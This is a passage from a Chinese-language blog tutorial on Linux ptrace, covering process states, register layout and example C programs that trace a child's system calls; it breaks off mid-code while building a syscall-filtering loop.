<p>形式：ptrace(PTRACE_GETFPREGS, pid, 0, data)<br>描述：读取浮点寄存器值，pid表示被跟踪的子进程，data为用户变量地址用于返回读到的数据。此功能将读取所有浮点协处理器387的所有寄存器的值。</p>
<p>15)PTRACE_SETFPREGS</p>
<p>形式：ptrace(PTRACE_SETREGS, pid, 0, data)<br>描述：设置浮点寄存器值，pid表示被跟踪的子进程，data为用户数据地址。此功能将设置所有浮点协处理器387的所有寄存器的值。</p>
<h3 id="1-6-3-进程状态值中止状态"><a href="#1-6-3-进程状态值中止状态" class="headerlink" title="1.6.3 进程状态值中止状态"></a>1.6.3 进程状态值中止状态</h3><p>在Linux系统中，进程常见的状态有下面这些</p>
<p>S：Interruptible Sleeping，即可中断睡眠；</p>
<p>D：Uninterruptible Sleeping，即不可中断睡眠；</p>
<p>R：Running or Runnable，即运行状态；</p>
<p>Z：Zombie，即僵尸状态</p>
<p>T：Stopped or Traced，即中止状态（注意是中止不是终止）</p>
<p>这里，我们关注点放在<code>T：Stopped or Traced</code>这个类型上。因为<code>Traced</code>类型是由<code>ptrace</code>系统调用提供的一个进程状态。实际上，在某些Linux发行版中，这个类型的进程状态标识符是<code>t</code>而非<code>T</code>。</p>
<hr>
<h4 id="1-6-3-1-Stopped状态"><a href="#1-6-3-1-Stopped状态" class="headerlink" title="1.6.3.1 Stopped状态"></a>1.6.3.1 Stopped状态</h4><p>如何能够让一个进程进入到“中止状态”呢？</p>
<p>我们可以通过ctrl+z来中止当前输入程序的运行，然后可以查看进程状态</p>
<p><img src="https://xswlhhh12345-blog-test.oss-cn-guangzhou.aliyuncs.com/img/1725521534710-ecc3e4f3-3a59-455a-8518-4ee9832628ef.png" alt="img"></p>
<p>之后再使用fg就可以恢复进程状态</p>
<p><img src="https://xswlhhh12345-blog-test.oss-cn-guangzhou.aliyuncs.com/img/1725521563404-2340e616-ddce-4047-b31e-be1016202d38.png" alt="img"></p>
<hr>
<h4 id="1-6-3-2-Traced状态——新手例子"><a href="#1-6-3-2-Traced状态——新手例子" class="headerlink" title="1.6.3.2 Traced状态——新手例子"></a>1.6.3.2 Traced状态——新手例子</h4><p>通过<code>ptrace</code>系统调用可以让一个进程进入<code>Traced</code>状态。</p>
<ul>
<li><p><code>tracee</code>进程调用<code>ptrace</code>系统调用，并在<code>request</code>参数处传递<code>PTRACE_TRACEME</code>这个值，表示想要被<code>tracer</code>进程追踪。通过这种方式的进程想要进入<code>Traced</code>状态有两种方式：</p>
</li>
<li><ul>
<li>主动调用<code>exec</code>系列的系统调用；</li>
<li><code>tracer</code>发送进入<code>Traced</code>状态的相关信号。</li>
</ul>
</li>
<li><p><code>tracer</code>进程调用<code>ptrace</code>系统调用，并在<code>request</code>参数处传递<code>PTRACE_ATTACH</code>这个值，并给出<code>tracee</code>进程的<code>pid</code>，从而让<code>tracee</code>进程进入<code>Traced</code>状态。</p>
</li>
</ul>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ptrace.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/user.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/reg.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">void</span>)</span></span>&#123;</span><br><span class="line">	<span class="type">pid_t</span> child;</span><br><span class="line">	<span class="type">long</span> orig_rax;</span><br><span class="line">	child=fork();</span><br><span class="line">	<span class="keyword">if</span>(child==<span class="number">0</span>)&#123;<span class="comment">//表示这是子进程，子进程fork返回0</span></span><br><span class="line">    <span class="comment">//当前进程会在每次执行系统调用之前暂停，并允许其父进程通过 ptrace 调用来检查和修改它的寄存器、内存等状态，或者继续它的执行。</span></span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;start move!!!&quot;</span>);</span><br><span class="line">        <span class="built_in">ptrace</span>(PTRACE_TRACEME,<span class="number">0</span>,<span class="literal">NULL</span>,<span class="literal">NULL</span>);<span class="comment">//0表示当前进程，参数规定是父进程跟踪</span></span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;keep moving???&quot;</span>);</span><br><span class="line">        <span class="built_in">execl</span>(<span class="string">&quot;/bin/ls&quot;</span>,<span class="string">&quot;ls&quot;</span>,<span class="string">&quot;-l&quot;</span>,<span class="string">&quot;-h&quot;</span>,<span class="literal">NULL</span>);<span class="comment">//这里进程被替换了？</span></span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;/bin/ls ok?&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;<span class="comment">//父进程，wait函数会等待子进程执行完再执行父进程</span></span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;father step1&quot;</span>);</span><br><span class="line">        <span class="built_in">wait</span>(<span class="literal">NULL</span>);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;father step2&quot;</span>);</span><br><span class="line">        orig_rax=<span class="built_in">ptrace</span>(PTRACE_PEEKUSER,child,<span class="number">8</span>*ORIG_RAX,<span class="literal">NULL</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Child process called a system call, id is %ld\n&quot;</span>,orig_rax);</span><br><span class="line">        <span class="built_in">ptrace</span>(PTRACE_CONT,child,<span class="literal">NULL</span>,<span class="literal">NULL</span>);</span><br><span class="line">    &#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>执行结果如下所示</p>
<p><img src="https://xswlhhh12345-blog-test.oss-cn-guangzhou.aliyuncs.com/img/1725523442460-5ab430b5-a6d0-4ab7-8010-b0217c4f5162.png" alt="img"></p>
<p>首先fork出来的进程和父进程是不分前后顺序的（前面说到顺序由高度函数决定），所以先父进程进入到else分支，子进程接着进入if分支，然后父进程执行了wait函数之后，交给子进程执行，执行到ptrace(PTRACE_TRACEME,0,NULL,NULL)，但是此时子进程并没有进入traced状态，直到执行到exec类型的函数（才会发出相关信号），才会让子进程也被父函数跟踪。回到父函数，父函数调用了ptrace(PTRACE_PEEKUSER,child,8*ORIG_RAX,NULL)获取子进程RAX的值，59即是execve的系统调用号。之后调用ptrace(PTRACE_CONT,child,NULL,NULL);，让子进程继续执行，也就有了下面的&#x2F;bin&#x2F;ls输出的内容。</p>
<hr>
<h5 id="1-6-3-2-1-可能有的一些问题"><a href="#1-6-3-2-1-可能有的一些问题" class="headerlink" title="1.6.3.2.1 可能有的一些问题"></a>1.6.3.2.1 可能有的一些问题</h5><p>问题1：父进程怎么向子进程发送信号？</p>
<p>问题2：execl系统调用给父进程发送SIGTRAP信号后，父进程怎么样处理这个信号？</p>
<ul>
<li><p>首先回答问题2:</p>
</li>
<li><ul>
<li><code>wait</code>系统调用是一个用来进行进程控制的系统调用，它可以用来阻塞父进程，当父进程接收到子进程传来信号或者子进程退出时，父进程才会继续运行。所以这里的<code>wait</code>系统调用很显然用来接收子进程调用<code>execl</code>时产生的<code>SIGTRAP</code>信号。</li>
</ul>
</li>
<li><p>然后是问题1：</p>
</li>
<li><ul>
<li><code>ptrace(PTRACE_CONT, child, NULL, NULL)</code>表达式：</li>
<li>父进程这里通过调用<code>ptrace</code>系统调用并使用<code>PTRACE_CONT</code>作为操作类型，这个操作类型的作用官方是这样描述的：<strong>恢复处于</strong><code>**Traced**</code><strong>状态的</strong><code>**tracee**</code><strong>进程。最后一个参数表示发送给</strong><code>**tracee**</code><strong>进程的信号。</strong></li>
</ul>
</li>
</ul>
<hr>
<h5 id="1-6-3-2-2-USER字段"><a href="#1-6-3-2-2-USER字段" class="headerlink" title="1.6.3.2.2 USER字段"></a>1.6.3.2.2 USER字段</h5><p>其实我们RAX的宏是这样的，那这个15是什么意思呢？</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">define ORIG_RAX <span class="number">15</span></span><br></pre></td></tr></table></figure>

<p>此时就要结合user字段的结构体来看了，<code>USER</code>字段的部分代码如下：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">user_regs_struct</span></span><br><span class="line">&#123;</span><br><span class="line">  __extension__ <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> <span class="type">int</span> r15;</span><br><span class="line">  __extension__ <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> <span class="type">int</span> r14;</span><br><span class="line">  __extension__ <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> <span class="type">int</span> r13;</span><br><span class="line">  __extension__ <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> <span class="type">int</span> r12;</span><br><span class="line">  __extension__ <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> <span class="type">int</span> rbp;</span><br><span class="line">  __extension__ <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> <span class="type">int</span> rbx;</span><br><span class="line">  __extension__ <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> <span class="type">int</span> r11;</span><br><span class="line">  __extension__ <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> <span class="type">int</span> r10;</span><br><span class="line">  __extension__ <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> <span class="type">int</span> r9;</span><br><span class="line">  __extension__ <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> <span class="type">int</span> r8;</span><br><span class="line">  __extension__ <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> <span class="type">int</span> rax;</span><br><span class="line">  __extension__ <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> <span class="type">int</span> rcx;</span><br><span class="line">  __extension__ <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> <span class="type">int</span> rdx;</span><br><span class="line">  __extension__ <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> <span class="type">int</span> rsi;</span><br><span class="line">  __extension__ <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> <span class="type">int</span> rdi;</span><br><span class="line">  __extension__ <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> <span class="type">int</span> orig_rax;</span><br><span class="line">  __extension__ <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> <span class="type">int</span> rip;</span><br><span class="line">  __extension__ <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> <span class="type">int</span> cs;</span><br><span class="line">  __extension__ <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> <span class="type">int</span> eflags;</span><br><span class="line">  __extension__ <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> <span class="type">int</span> rsp;</span><br><span class="line">  __extension__ <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> <span class="type">int</span> ss;</span><br><span class="line">  __extension__ <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> <span class="type">int</span> fs_base;</span><br><span class="line">  __extension__ <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> <span class="type">int</span> gs_base;</span><br><span class="line">  __extension__ <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> <span class="type">int</span> ds;</span><br><span class="line">  __extension__ <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> <span class="type">int</span> es;</span><br><span class="line">  __extension__ <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> <span class="type">int</span> fs;</span><br><span class="line">  __extension__ <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> <span class="type">int</span> gs;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">user</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">user_regs_struct</span>   regs;</span><br><span class="line">  <span class="comment">// other fields</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>user结构体第一个字段就是所有寄存器的信息struct user_regs_struct   regs;</p>
<p>这个结构体里面都是unsigned long long int类型的成员。我们再结合ptrace系统调用看看</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">orig_rax = ptrace(PTRACE_PEEKUSER, child, <span class="number">8</span> * ORIG_RAX, <span class="literal">NULL</span>);</span><br></pre></td></tr></table></figure>

<p><code>addr</code>字段我们传的是<code>8 * ORIG_RAX</code>，其中<code>8</code>代表每个成员的大小（long long int在64位系统中所占用的大小），而<code>ORIG_RAX(15)</code>刚好对应在<code>user_regs_struct</code>字段中的<code>orig_rax</code>成员。</p>
<p>这个成员在执行完execve系统调用后，存着的就是系统调用号。</p>
<hr>
<h4 id="1-6-3-3-Traced状态——入门例子"><a href="#1-6-3-3-Traced状态——入门例子" class="headerlink" title="1.6.3.3 Traced状态——入门例子"></a>1.6.3.3 Traced状态——入门例子</h4><p>在上面的版本的demo中，我们已经能够理解父子进程中使用ptrace能做到的一些事情了。我们在上面的demo跟着参考文章进行一些改进。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ptrace.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/user.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/reg.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">pid_t</span> child;</span><br><span class="line">	<span class="type">long</span> orig_rax;</span><br><span class="line">	child=fork();</span><br><span class="line">    <span class="type">int</span> status=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span>(child==<span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        ptrace(PTRACE_TRACEME,<span class="number">0</span>,<span class="literal">NULL</span>,<span class="literal">NULL</span>);</span><br><span class="line">        execl(<span class="string">&quot;/bin/ls&quot;</span>,<span class="string">&quot;ls&quot;</span>,<span class="string">&quot;-l&quot;</span>,<span class="string">&quot;-h&quot;</span>,<span class="literal">NULL</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line">            wait(&amp;status);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;Origen signal %d !Got signal %d\n&quot;</span>,status,WSTOPSIG(status));</span><br><span class="line">            <span class="keyword">if</span>(WIFEXITED(status)) <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">            orig_rax=ptrace(PTRACE_PEEKUSER,child,<span class="number">8</span>*ORIG_RAX,<span class="literal">NULL</span>);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;Program called system call: %ld\n&quot;</span>, orig_rax);</span><br><span class="line">            ptrace(PTRACE_SYSCALL, child, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>相关宏的设置是这样的。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> WIFEXITED(status)    (((status) &amp; 0xff) == 0)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> WIFSTOPPED(status)   (((status) &amp; 0xff) == 0x7f)</span></span><br></pre></td></tr></table></figure>

<p>这里涉及到的新东西有以下几个。</p>
<ol>
<li>wait(&amp;status);</li>
<li>ptrace(PTRACE_SYSCALL, child, NULL, NULL);</li>
<li>父进程的调用是在一个死循环里</li>
</ol>
<p>运行结果如下所示</p>
<p><img src="https://xswlhhh12345-blog-test.oss-cn-guangzhou.aliyuncs.com/img/1725531833655-06cbd253-9b05-4082-a266-3f368db9af93.png" alt="img"></p>
<hr>
<h5 id="1-6-3-3-1-wait-status-以及相关宏"><a href="#1-6-3-3-1-wait-status-以及相关宏" class="headerlink" title="1.6.3.3.1 wait(&amp;status)以及相关宏"></a>1.6.3.3.1 wait(&amp;status)以及相关宏</h5><p>上面讲wait函数的时候提到过，这时候会关心子进程返回的信号类型，也就是说会接收子进程来的信号。</p>
<p>接收到信号之后，WSTOPSIG宏可以获取信号对应的编号，具体编号可以用kill -l指令展现出来</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">qwq@qwq:~/ctf$ kill -l</span><br><span class="line"> <span class="number">1</span>) SIGHUP	 <span class="number">2</span>) SIGINT	 <span class="number">3</span>) SIGQUIT	 <span class="number">4</span>) SIGILL	 <span class="number">5</span>) SIGTRAP</span><br><span class="line"> <span class="number">6</span>) SIGABRT	 <span class="number">7</span>) SIGBUS	 <span class="number">8</span>) SIGFPE	 <span class="number">9</span>) SIGKILL	<span class="number">10</span>) SIGUSR1</span><br><span class="line"><span class="number">11</span>) SIGSEGV	<span class="number">12</span>) SIGUSR2	<span class="number">13</span>) SIGPIPE	<span class="number">14</span>) SIGALRM	<span class="number">15</span>) SIGTERM</span><br><span class="line"><span class="number">16</span>) SIGSTKFLT	<span class="number">17</span>) SIGCHLD	<span class="number">18</span>) SIGCONT	<span class="number">19</span>) SIGSTOP	<span class="number">20</span>) SIGTSTP</span><br><span class="line"><span class="number">21</span>) SIGTTIN	<span class="number">22</span>) SIGTTOU	<span class="number">23</span>) SIGURG	<span class="number">24</span>) SIGXCPU	<span class="number">25</span>) SIGXFSZ</span><br><span class="line"><span class="number">26</span>) SIGVTALRM	<span class="number">27</span>) SIGPROF	<span class="number">28</span>) SIGWINCH	<span class="number">29</span>) SIGIO	<span class="number">30</span>) SIGPWR</span><br><span class="line"><span class="number">31</span>) SIGSYS	<span class="number">34</span>) SIGRTMIN	<span class="number">35</span>) SIGRTMIN+<span class="number">1</span>	<span class="number">36</span>) SIGRTMIN+<span class="number">2</span>	<span class="number">37</span>) SIGRTMIN+<span class="number">3</span></span><br><span class="line"><span class="number">38</span>) SIGRTMIN+<span class="number">4</span>	<span class="number">39</span>) SIGRTMIN+<span class="number">5</span>	<span class="number">40</span>) SIGRTMIN+<span class="number">6</span>	<span class="number">41</span>) SIGRTMIN+<span class="number">7</span>	<span class="number">42</span>) SIGRTMIN+<span class="number">8</span></span><br><span class="line"><span class="number">43</span>) SIGRTMIN+<span class="number">9</span>	<span class="number">44</span>) SIGRTMIN+<span class="number">10</span>	<span class="number">45</span>) SIGRTMIN+<span class="number">11</span>	<span class="number">46</span>) SIGRTMIN+<span class="number">12</span>	<span class="number">47</span>) SIGRTMIN+<span class="number">13</span></span><br><span class="line"><span class="number">48</span>) SIGRTMIN+<span class="number">14</span>	<span class="number">49</span>) SIGRTMIN+<span class="number">15</span>	<span class="number">50</span>) SIGRTMAX<span class="number">-14</span>	<span class="number">51</span>) SIGRTMAX<span class="number">-13</span>	<span class="number">52</span>) SIGRTMAX<span class="number">-12</span></span><br><span class="line"><span class="number">53</span>) SIGRTMAX<span class="number">-11</span>	<span class="number">54</span>) SIGRTMAX<span class="number">-10</span>	<span class="number">55</span>) SIGRTMAX<span class="number">-9</span>	<span class="number">56</span>) SIGRTMAX<span class="number">-8</span>	<span class="number">57</span>) SIGRTMAX<span class="number">-7</span></span><br><span class="line"><span class="number">58</span>) SIGRTMAX<span class="number">-6</span>	<span class="number">59</span>) SIGRTMAX<span class="number">-5</span>	<span class="number">60</span>) SIGRTMAX<span class="number">-4</span>	<span class="number">61</span>) SIGRTMAX<span class="number">-3</span>	<span class="number">62</span>) SIGRTMAX<span class="number">-2</span></span><br><span class="line"><span class="number">63</span>) SIGRTMAX<span class="number">-1</span>	<span class="number">64</span>) SIGRTMAX	</span><br></pre></td></tr></table></figure>

<p>WIFEXITED宏可以检测接收到的型号是否标志着子进程退出，其宏定义为。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># in sys/wait.h</span></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> WIFEXITED(status)  __WIFEXITED (__WAIT_INT (status))</span></span><br><span class="line"></span><br><span class="line"><span class="meta"># in bits/waitstatus.h</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __WIFEXITED(status) (__WTERMSIG(status) == 0)</span></span><br></pre></td></tr></table></figure>

<p>也就是说，如果接收到的信号编号为<code>0</code>，就意味着子进程退出。</p>
<hr>
<p>子进程什么时候会向父进程发送信号？</p>
<p>目前情况是syscall的时候会向父进程发一次</p>
<hr>
<h5 id="1-6-3-3-2-PTRACE-SYSCALL与while循环"><a href="#1-6-3-3-2-PTRACE-SYSCALL与while循环" class="headerlink" title="1.6.3.3.2 PTRACE_SYSCALL与while循环"></a>1.6.3.3.2 PTRACE_SYSCALL与while循环</h5><p>照搬上面的解释</p>
<p>形式：ptrace(PTRACE_SYS, pid, 0, signal)<br>描述：继续执行。pid表示被跟踪的子进程，signal为0则忽略引起调试进程中止的信号，若不为0则继续处理信号signal。<strong>与PTRACE_CONT不同的是进行系统调用跟踪</strong>。在被跟踪进程继续运行直到调用系统调用开始或结束时，被跟踪进程被中止，并通知父进程。</p>
<p>PTRACE_SYSCALL与PTRACE_CONT有如下的关系</p>
<p>与<code>PTRACE_CONT</code>功能类似，使子进程继续执行，其最后一个参数也和<code>PTRACE_CONT</code>一样，表示是否发送相应信号给子进程。</p>
<p>发生systemcall相关的事件（包括systemcall开始和systemcall结束）时子进程需要通知父进程。<strong>要注意的是每次子进程被暂停后都需要重新调用PTRACE_SYSCALL以便下一次的system call事件会被捕抓到。</strong></p>
<p>根据<code>PTRACE_SYSCALL</code>的功能描述，我们通过一个<code>while</code>循环体来接收子进程每一次<code>system call</code>发出的信号，并在处理完成后再次通过<code>PTRACE_SYSCALL</code>来捕获下一次<code>system call</code>的信号，并当子进程退出时结束循环。</p>
<hr>
<h5 id="1-6-3-3-3-运行结果解析"><a href="#1-6-3-3-3-运行结果解析" class="headerlink" title="1.6.3.3.3 运行结果解析"></a>1.6.3.3.3 运行结果解析</h5><p>运行结果打印出来的都是三个东西</p>
<p>Origen signal 1407 !Got signal 5</p>
<p>Program called system call: 59</p>
<p>其中上面的1407和5也就是signal信号都是全部一致的</p>
<p>一开始就出现了59号的系统调用，这是因为调用了execve</p>
<p>之后则是12&#x2F;158&#x2F;9&#x2F;21&#x2F;257&#x2F;3&#x2F;0&#x2F;262&#x2F;10&#x2F;17&#x2F;218&#x2F;137&#x2F;318&#x2F;202&#x2F;191&#x2F;41……</p>
<p>除了一开始的59，<strong>其他的系统调用都是重复出现的。这是因为PTRACE_SYSCALL会让子进程在每次系统调用进入和退出的时候都发出信号。</strong></p>
<p>父进程<code>wait</code>系统调用每次接收到的信号都是<code>5）SIGTRAP</code>。</p>
<hr>
<h4 id="1-6-3-4-Traced状态——进阶例子"><a href="#1-6-3-4-Traced状态——进阶例子" class="headerlink" title="1.6.3.4 Traced状态——进阶例子"></a>1.6.3.4 Traced状态——进阶例子</h4><h5 id="1-6-3-4-1-过滤execve的框架"><a href="#1-6-3-4-1-过滤execve的框架" class="headerlink" title="1.6.3.4.1 过滤execve的框架"></a>1.6.3.4.1 过滤execve的框架</h5><p>往往tracee进程都会通过ptrace+execve的方式将自身转变为一个处于中止状态的进程，而tracer进程往往会通过wait系统调用来接收由tracee进程发出的SIGTRAP信号。因此在这种场景下，第一个信号一定是对应execve这个系统调用的，而并不是我们想要追踪的进程的系统调用，因此我们忽略这个信号。</p>
<p>所以下面的代码有一个空的死循环，我们还没写进去code，我们先在死循环接受第一个信号execve</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ptrace.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/reg.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> **argv)</span>&#123;</span><br><span class="line">  <span class="type">pid_t</span> child = fork();</span><br><span class="line">  <span class="type">int</span> status = <span class="number">0</span>;</span><br><span class="line">  <span class="type">long</span> orig_rax = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> (child == <span class="number">0</span>)&#123;</span><br><span class="line">    ptrace(PTRACE_TRACEME, <span class="number">0</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line">    execl(<span class="string">&quot;/bin/ls&quot;</span>, <span class="string">&quot;ls&quot;</span>, <span class="string">&quot;-l&quot;</span>, <span class="string">&quot;-h&quot;</span>, <span class="literal">NULL</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line"></span><br><span class="line">    wait(&amp;status);</span><br><span class="line">    ptrace(PTRACE_SYSCALL, child, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line">      <span class="comment">// code block</span></span><br><span class="line">    